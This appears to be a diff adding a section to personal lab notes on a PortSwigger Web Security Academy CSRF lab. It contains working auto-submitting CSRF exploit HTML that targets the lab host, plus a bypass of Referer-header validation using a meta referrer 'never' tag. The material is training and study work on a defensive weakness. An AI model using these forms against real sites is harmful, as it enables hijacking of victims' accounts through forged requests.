@@ -170,6 +170,74 @@ Exploit:
 </html>
 ```
 
+**CSRF where Referer validation depends on header being present**
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7500b508-bbda-4d08-a4cf-e47133e131e9)
+
+
+
+Meet 3 requirement for csrf attack
+
+A relevant action: change email
+Cookie-based session handling: session cookie
+No unpredictable request parameter: no csrf token in parameter 
+
+If we host a typical csrf form 
+```
+<html>
+    <body>
+    <script> history.pushState(' ',' ', '/')</script>
+    <form action="https://0af6002b044ec32084de63e900bb0053.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="vffasf@gmail.com"/>
+        <input type="submit" value="submit request"/>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+    </body>
+</html>
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/d2676c46-8bff-4fc1-8d25-3506009a30b2)
+
+
+We will get 
+"invalid refer header"
+There checking the refer header to make sure there no crossdomain request 
+Refer header is a optional request header that contain the url of the page that is making the request 
+Defend against csrf attack to make sure that the request came from the same domain as the website 
+If it came with anything else it will be ban
+
+Refer header is shown on our request 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/41c3f723-4762-49e9-93c4-1f424f379ada)
+
+
+Not a good defense cause the referer header can be spoof
+
+Testing referer header for csrf attacks:
+```
+1. Remove the referer header
+	Got a 302 response
+```
+We need to make sure our form don’t accept referer header
+Use the meta tag 
+Will not include refer tag
+```
+<html>
+    <head>
+        <meta name="referrer" content="never">   
+    </head>
+    <body>
+    <script> history.pushState(' ',' ', '/')</script>
+    <form action="https://0af6002b044ec32084de63e900bb0053.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="vffasf@gmail.com"/>
+        <input type="submit" value="submit request"/>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+    </body>
+</html>
+```
+
 
 
 
